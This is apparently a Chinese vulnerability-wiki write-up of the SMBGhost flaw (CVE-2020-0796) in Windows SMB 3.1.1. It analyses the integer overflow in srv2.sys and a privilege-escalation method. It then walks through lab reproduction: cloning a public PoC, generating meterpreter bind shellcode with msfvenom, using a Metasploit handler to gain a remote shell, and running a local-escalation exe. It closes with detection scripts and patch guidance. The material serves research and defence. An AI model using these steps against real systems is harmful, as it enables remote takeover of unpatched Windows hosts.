（CVE­-2020­-0796） Windows 远程溢出漏洞
----------------------------------------

### 一、漏洞简介

漏洞公告显示，SMB
3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。

### 二、漏洞影响

Windows 10 1903版本（用于基于x32的系统）

Windows 10 1903版（用于基于x64的系统）

Windows 10 1903版（用于基于ARM64的系统） Windows Server
1903版（服务器核心安装）
Windows 10 1909版本（用于基于x32的系统） Windows
10版本1909（用于基于x64的系统）
Windows 10 1909版（用于基于ARM64的系统） Windows
Server版本1909（服务器核心安装）

### 三、复现过程

### 漏洞分析

漏洞公告显示，SMB
3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。

#### 1、根本原因

漏洞发生在srv2.sys中,由于SMB没有正确处理压缩的数据包,在解压数据包的时候使用客户端传过来的长度进行解压时,并没有检查长度是否合法.最终导致整数溢出。

#### 2、初步分析

该错误是发生在srv2.sys
SMB服务器驱动程序中的Srv2DecompressData函数中的整数溢出错误。这是该函数的简化版本，省略了不相关的细节：

    typedef struct \_COMPRESSION_TRANSFORM_HEADER
    
    {
    
    >   ULONG ProtocolId;
    
    >   ULONG OriginalCompressedSegmentSize; USHORT CompressionAlgorithm;
    
    >   USHORT Flags; ULONG Offset;
    
    } COMPRESSION_TRANSFORM_HEADER, \*PCOMPRESSION_TRANSFORM_HEADER;
    
    typedef struct \_ALLOCATION_HEADER
    
    {
    
    >   // ...
    
    >   PVOID UserBuffer;
    
    >   // ...
    
    } ALLOCATION_HEADER, \*PALLOCATION_HEADER;
    
    NTSTATUS Srv2DecompressData(PCOMPRESSION_TRANSFORM_HEADER Header, SIZE_T
    TotalSize)
    
    {
    
    >   PALLOCATION_HEADER Alloc = SrvNetAllocateBuffer(
    
    >   (ULONG)(Header-\>OriginalCompressedSegmentSize + Header-\>Offset), NULL);
    
    >   If (!Alloc) {
    
    >   return STATUS_INSUFFICIENT_RESOURCES;
    
    >   }
    
    >   ULONG FinalCompressedSize = 0;
    
    >   NTSTATUS Status = SmbCompressionDecompress( Header-\>CompressionAlgorithm,
    
    >   (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER) + Header-\>Offset,
    >   (ULONG)(TotalSize - sizeof(COMPRESSION_TRANSFORM_HEADER) - Header-\>Offset),
    >   (PUCHAR)Alloc-\>UserBuffer + Header-\>Offset,
    
    >   Header-\>OriginalCompressedSegmentSize, \&FinalCompressedSize);
    
    >   if (Status \< 0 \|\| FinalCompressedSize !=
    >   Header-\>OriginalCompressedSegmentSize) { SrvNetFreeBuffer(Alloc);
    
    >   return STATUS_BAD_DATA;
    
    >   }
    
    >   if (Header-\>Offset \> 0) { memcpy(
    
    >   Alloc-\>UserBuffer,
    
    >   (PUCHAR)Header + sizeof(COMPRESSION_TRANSFORM_HEADER),
    
    >   Header-\>Offset);
    
    >   }
    
    >   Srv2ReplaceReceiveBuffer(some_session_handle, Alloc); return STATUS_SUCCESS;
    
    }

该Srv2DecompressData函数接收客户端发送的压缩消息，分配所需的内存量，并解压缩数据。然后，如果Offset字段不为零，它会将放置在压缩数据之前的数据复制到分配的缓冲区的开头。

![1.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId27.png)

如果仔细观察，我们会发现第20行和第31行可能导致某些输入的整数溢出。例如，大多数在bug发布后不久出现并导致系统崩溃的poc都使用0xffffff值作为Offset字段。使用该值0xffffff会在第20行触发整
数溢出，因此分配的字节更少。

稍后，它会在第31行触发额外的整数溢出。崩溃是由于在第30行中计算出的远离接收消息的地址处的内存访问造成的。如果代码在第31行验证了计算结果，那么它将很早退出，因为缓冲区长度恰好

是负数且无法表示，这也使得第30行的地址本身也无效。

![2.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId28.png)

### 3、选择溢出内容

只有两个相关字段可以控制以导致整数溢出的字段：OriginalCompressedSegmentSize和Offset，因
此没有太多选择。在尝试了几种组合之后，下面的组合吸引了我们：如果我们发送一个合法的偏移值和一个巨大的原始压缩段大小值呢？让我们回顾一下代码将要执行的三个步骤：

1.  分配：由于整数溢出，分配的字节数将小于两个字段的总和。

2.  解压缩：解压缩将收到一个非常大的OriginalCompressedSegmentSize值，将目标缓冲区视为具有无限大小。所有其他参数均不受影响，因此它将按预期执行。

3.  复制：如果要执行，则复制将按预期执行。

不管是否要执行复制步骤，它看起来已经很有趣了------我们可以在解压缩阶段触发越界写入，因为我们设法分配了比"分配"阶段所需的字节少的字节。

![3.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId30.png)

如您所见，使用这种技术，我们可以触发任何大小和内容的溢出，这是一个很好的开始。但是什么位于我们的缓冲区之外？让我们找出答案！

### 4、深入分析SrvNetAllocateBuffer

为了回答这个问题，我们需要查看分配函数，在我们的例子中是SrvNetAllocateBuffer。下面是函数的有趣部分：

    PALLOCATION_HEADER SrvNetAllocateBuffer(SIZE_T AllocSize, PALLOCATION_HEADER
    SourceBuffer)
    
    {
    
    >   // ...
    
    >   if (SrvDisableNetBufferLookAsideList \|\| AllocSize \> 0x100100) { if
    >   (AllocSize \> 0x1000100) {
    
    >   return NULL;
    
    >   }
    
    >   Result = SrvNetAllocateBufferFromPool(AllocSize, AllocSize);
    
    >   } else {
    
    >   int LookasideListIndex = 0; if (AllocSize \> 0x1100) {
    
    >   LookasideListIndex = /\* some calculation based on AllocSize \*/;
    
    >   }
    
    >   SOME_STRUCT list = SrvNetBufferLookasides[LookasideListIndex]; Result = /\*
    >   fetch result from list \*/;
    
    >   }
    
    >   // Initialize some Result fields...
    
    >   return Result;
    
    }

我们可以看到分配函数根据所需的字节数执行不同的操作。大型分配（大于约16MB）会导致执行失败。中型分配（大于约1\
MB）使用SrvNetAllocateBufferFromPool函数进行分配。小型分配（其余\
的）使用lookaside列表进行优化。

注意：还有一个SrvDisableNetBufferLookAsideList标志会影响函数的功能，但是它是由一个未记录的注册表设置来设置的，并且默认情况下处于禁用状态，因此并不是很有趣。

Lookaside列表用于有效地为驱动程序保留一组可重用的、固定大小的缓冲区。lookaside列表的功能之一是定义一个自定义的分配/释放函数，用于管理缓冲区。查看SrvNetBufferLookasides数组的引\
用，我们发现它是在SrvNetCreateBufferLookasides函数中初始化的，通过查看它，我们了解到以下内容：

> 自定义分配函数定义为SrvNetBufferLookasideAllocate，它只调用
>
> SrvNetAllocateBufferFromPool
>
> 9个lookaside列表按以下大小创建，我们使用Python快速计算：
>
> \>\>\> \[hex((1 \<\< (i + 12)) + 256) for i in range(9)\]
>
> \['0x1100', '0x2100', '0x4100', '0x8100', '0x10100', '0x20100',
> '0x40100',\
> '0x80100', '0x100100'\]
>
> 这与我们的发现相匹配，即分配大于0x100100字节的分配时不使用lookaside列表。

结论是每个分配请求最终都出现在SrvNetAllocateBufferFromPool函数中，所以让我们来分析它。

### 5、SrvNetAllocateBufferFromPool和分配的缓冲区布局

SrvNetAllocateBufferFromPool函数使用ExAllocatePoolWithTag函数在NonPagedPoolNx池中分配一个缓冲区，然后用数据填充一些结构。分配的缓冲区的布局如下：

![4.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId33.png)

在我们的研究范围内，此布局的唯一相关部分是用户缓冲区和分配头结构。我们可以马上看到，通过溢出用户缓冲区，我们最终会重写ALLOCATION\_HEADER结构。看起来很方便。

### 6、重写分配头结构

此时，我们的第一个想法是，由SmbCompressionDecompress调用之后的检查：

    >   if (Status \< 0 \|\| FinalCompressedSize !=
    >   Header-\>OriginalCompressedSegmentSize) { SrvNetFreeBuffer(Alloc);
    
    >   return STATUS_BAD_DATA;
    
    }

SrvNetFreeBuffer将被调用，并且该函数将失败，因为我们将其设计OriginalCompressedSegmentSize为一个很大的数字，并且FinalCompressedSize将成为一个较小的数字，代表实际的解压缩字节数。因此，我们分析了该SrvNetFreeBuffer函数，成功地替换了一个幻数的分配指针，然后等待free函数尝试对其进行释放，以期稍后将其用于free­after­free或类似用途。但是令我们惊讶的是，该memcpy函数崩溃了。这使我们感到高兴，因为我们根本没有想到哪里，但我们必须检查为什么会这样。可以在SmbCompressionDecompress函数的实现中找到说明：

    >   NTSTATUS SmbCompressionDecompress( USHORT CompressionAlgorithm, PUCHAR
    >   UncompressedBuffer, ULONG UncompressedBufferSize, PUCHAR CompressedBuffer,
    
    >   ULONG CompressedBufferSize, PULONG FinalCompressedSize)
    
    {
    
    >   // ...
    
    >   NTSTATUS Status = RtlDecompressBufferEx2(
    
    >   ...,
    
    >   FinalUncompressedSize,
    
    >   ...);
    
    >   if (Status \>= 0) {
    
    >   \*FinalCompressedSize = CompressedBufferSize;
    
    >   }
    
    >   // ...
    
    >   return Status;
    
    }

基本上，如果解压成功，FinalCompressedSize将更新为保存CompressedBufferSize的值，它是缓
冲区的大小。这种对FinalCompressedSize返回值的故意更新对我们来说似乎非常可疑，因为这个小细节，加上分配的缓冲区布局，允许非常方便地利用这个bug。

由于执行继续到复制原始数据的阶段，让我们再次检查调用：

    memcpy（
    
    >   Alloc-\> UserBuffer，
    
    >   （PUCHAR）标题+ sizeof（COMPRESSION_TRANSFORM_HEADER）， Header-\> Offset）;

从ALLOCATION\_HEADER结构中读取目标地址，我们可以覆盖该结构。缓冲区的内容和大小也由我们控制。

### 7、本地权限提升

既然我们有了写在哪里开发，我们能用它做什么？很明显我们可以让系统崩溃。我们可能能够触发远程代码执行，但我们还没有找到这样做的方法。如果我们在本地主机上使用此漏洞并泄漏其他信息，
我们可以将其用于本地权限提升，因为已经通过几种技术证明了这一点

我们尝试的第一种技术是Morten Schenk在其《*Black Hat USA*
*2017》演讲中提出的*。该技术涉及重写win32的.data部分中的函数指针数据库系统驱动程序，然后从用户模式调用相应的函数以获得代码执行。j00ru写了一篇关于在WCTF
2018中使用此技术的精彩文章，并提供了他的漏洞源代码。我们针对write what
where漏洞进行了调整，但发现它不起作用，因为处理SMB消息的线程不是GUI线

程。因此，win32数据库系统没有映射，而且技术也不相关（除非有办法使它成为一个GUI线程，这是我们没有研究过的）。

我们最终在2012年的黑帽演示中使用了cesarcer所介绍的著名技术---轻松本地Windows内核开发。
该技术是通过使用NtQuerySystemInformation（SystemHandleInformation）API泄漏当前进程令牌
地址，然后重写该地址，授予当前进程令牌权限，这些权限可用于权限提升。Bryan
Alexander（dronesec）和Stephen
Breen（breenmachine）（2017）在EoP研究中滥用代理权限，
展示了使用各种令牌特权提升特权的几种方法。

我们基于Alexandre
Beaulieu在利用任意写操作提升权限writeup时共享的代码进行攻击。在修改进程的令牌特权后，我们通过将DLL注入winlogon.exe.
DLL的全部目的是启动命令提示符.
我们的完整本地特权升级证明可在*此处*找到，仅可用于研究/防御目的。

四、CVE­2020­0796 RCE漏洞复现
-----------------------------

### 环境准备

攻击机：kal2019 ip:192.168.1.101

目标靶机：windows10 1903 x64 (专业版，企业版也可以） ip:192.168.1.103

目 标 靶 机 的 下 载 地 址 ：
ed2k://\|file\|cn\_windows\_10\_business\_editions\_version\_1903\_x64\_dvd\_e001dd2c.iso\|4815527936\|
47D4C57E638DF8BF74C59261E2CE702D\|/

**环境要求：**

该poc不太稳定，需要多次测试(猜测是占用监听端口或者网络问题），有可能出现蓝屏现象(2).如果POC失败，可能是目标系统开启系统自带的defender拦截了。

**复现步骤**

kali下克隆下载利用poc

`root\@kali2019:/opt\# git clone* https://github.com/ianxtianxt/SMBGhost_RCE_PoC.git`

![5.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId38.jpg)

切换到利用poc目录下

`root\@kali2019:/opt\# cd SMBGhost_RCE_PoC/`

![6.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId39.jpg)

该POC需要用python3环境执行

![7.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId40.png)

可以看到目标靶机的IP地址以及系统版本

![8.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId41.png)

![9.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId42.png)

在kali下生成python版本的反弹shellcode

`root\@kali2019:\~\# msfvenom ``­``p windows/x64/meterpreter/bind_tcp lport=2333 ``­``f py ``­``o exp.py`

![10.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId43.jpg)

![11.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId44.png)

可以看到生成的shellcode root\@kali2019:\~\# cat exp.py

将生成的exp.py代码中的变量buf全部替换成变量USER\_PAYLOAD，然后将所有代码粘贴覆盖下面的代码处：

![12.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId45.jpg)

在kali上启动MSF，并如下设置`msf5 \> use exploit/multi/handler`

`msf5 exploit(multi/handler) \> set payload windows/x64/meterpreter/bind_tcp`\
\#设置反弹模式msf5 exploit(multi/handler) \> set rhost 192.168.1.103\
\#设置目标靶机IP地址

![13.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId46.png)

`msf5 exploit(multi/handler) \> set lport 2333 \#设置监听端口msf5`\
`exploit(multi/handler) \> exploit`

执行利用poc，可以看到成功执行，在按任意键，最好回车键即可`python3 exploit.py ``­``ip 192.168.1.103`

![14.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId47.jpg)

![15.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId48.jpg)

在msf可以看到成功反弹出目标靶机的shell

### 五、CVE­2020­0796 本地提权漏洞复现

环境要求，需要windows 10 1909 x64

下 载 地 址 ：\
ed2k://\|file\|cn\_windows\_10\_business\_editions\_version\_1909\_x64\_dvd\_0ca83907.iso\|5275090944\|\
9BCD5FA6C8009E4D0260E4B23008BD47\|/

**提权POC:**

    https://download.0-sec.org/系统安全/Windows/CVE-2020-0796提权poc.zip

![16.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId50.png)

这里我新建了一个普通权限的账号，可以看到权限很小

![17.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId51.png)

在普通账号上执行cve­2020­0796­local.exe，可以看到成功提权到system权限

![18.jpg](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId52.jpg)

### 六、漏洞检测

![19.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId54.png)
奇 安 信 批 量 检 测 工 具 ：
*http://dl.qianxin.com/skylar6/CVE­2020­0796­Scanner.zip*

sh 脚 本 检 测 ：
[https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de9\
37f5b6810df4441cc84f0fa63991e2e/check­smb­v3.11.sh](https://gist.githubusercontent.com/nikallass/40f3215e6294e94cde78ca60dbe07394/raw/84d803de937f5b6810df4441cc84f0fa63991e2e/check-smb-v3.11.sh)

![20.png](/Users/aresx/Documents/VulWiki/.resource/(CVE­-2020­-0796)Windows远程溢出漏洞/media/rId56.png)

    #!/bin/bash
    if [ $# -eq 0 ]
      then
        echo $'Usage:\n\tcheck-smb-v3.11.sh TARGET_IP_or_CIDR'
        exit 1
    fi
    
    echo "Checking if there's SMB v3.11 in" $1 "..."
    
    nmap -p445 --script smb-protocols -Pn -n $1 | grep -P '\d+\.\d+\.\d+\.\d+|^\|.\s+3.11' | tr '\n' ' ' | replace 'Nmap scan report for' '@' | tr "@" "\n" | grep 3.11 | tr '|' ' ' | tr '_' ' ' | grep -oP '\d+\.\d+\.\d+\.\d+'
    
    if [[ $? != 0 ]]; then
        echo "There's no SMB v3.11"
    fi

### 七、漏洞修复

更新，完成补丁的安装。

操作步骤：设置­\>更新和安全­\>Windows更新，点击"检查更新"。

微软给出了临时的应对办法：

运行regedit.exe，打开注册表编辑器，在HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters建立一个名为DisableCompression的DWORD，值为1，禁止SMB的压缩功能。

对SMB通信445端口进行封禁。

补丁链接<https://catalog.update.microsoft.com/v7/site/Search.aspx?q=KB4551762>

### 八、参考连接

> https://www.cnblogs.com/A66666/p/29635a243378b49ccb485c7a280df989.html\>
> https://github.com/danigargu/CVE­2020­0796
> http://dl.qianxin.com/skylar6 https://github.com/ollypwn/SMBGhost
> https://github.com/chompie1337/SMBGhost\_RCE\_PoC
> https://github.com/danigargu/CVE­2020­0796
> https://blog.zecops.com/vulnerabilities/exploiting­smbghost­cve­2020­0796­for­a­local­privilege­escalation­writeup­and­poc/
